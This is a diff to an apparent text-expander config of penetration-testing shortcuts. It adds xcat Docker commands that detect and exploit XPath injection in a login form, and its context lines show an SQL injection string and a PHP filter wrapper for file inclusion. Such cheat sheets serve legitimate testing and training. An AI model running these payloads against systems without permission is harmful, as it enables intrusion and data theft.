@@ -76,6 +76,14 @@ matches:
   - trigger: ":sqli_basic"
     replace: "' OR '1'='1#"
 
+  #### XPath
+  # Here we have a GET example and a POST example with xcat
+  - trigger: ":xpath_detect"
+    replace: sudo docker run -it tomforbes/xcat detect http://[ip]:[port]/index.php username username=admin -m POST --true-string='!No Result' --encode FORM
+
+  - trigger: ":xpath_exfill"
+    replace: sudo docker run -it tomforbes/xcat run http://[ip]:[port]/index.php username username=admin -m POST --true-string='successfully' --encode FORM
+
   #### LFI
   - trigger: ":lfi_phpwrapper"
     replace: php://filter/convert.base64-encode/resource=[file]
